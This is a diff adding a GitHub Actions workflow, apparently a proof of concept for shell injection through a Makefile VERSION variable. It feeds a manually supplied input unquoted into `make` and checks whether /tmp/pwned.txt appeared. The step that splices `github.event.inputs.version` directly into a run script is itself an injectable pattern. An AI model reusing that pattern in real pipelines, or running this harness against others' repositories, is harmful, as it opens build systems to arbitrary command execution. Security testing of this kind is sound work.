@@ -1,0 +1,26 @@
+name: PoC - Shell Injection via VERSION
+
+on:
+  workflow_dispatch:
+    inputs:
+      version:
+        description: "VERSION value"
+        required: true
+
+jobs:
+  test-injection:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout vulnerable repo
+        uses: actions/checkout@v4
+
+      - name: Run vulnerable make with injected VERSION
+        run: |
+          echo "[+] Running vulnerable make VERSION input"
+          make VERSION="${{ github.event.inputs.version }}"
+          
+      - name: Check if injection worked
+        run: |
+          echo "[+] Checking for injected file..."
+          ls -la /tmp
+          cat /tmp/pwned.txt || echo "No file"
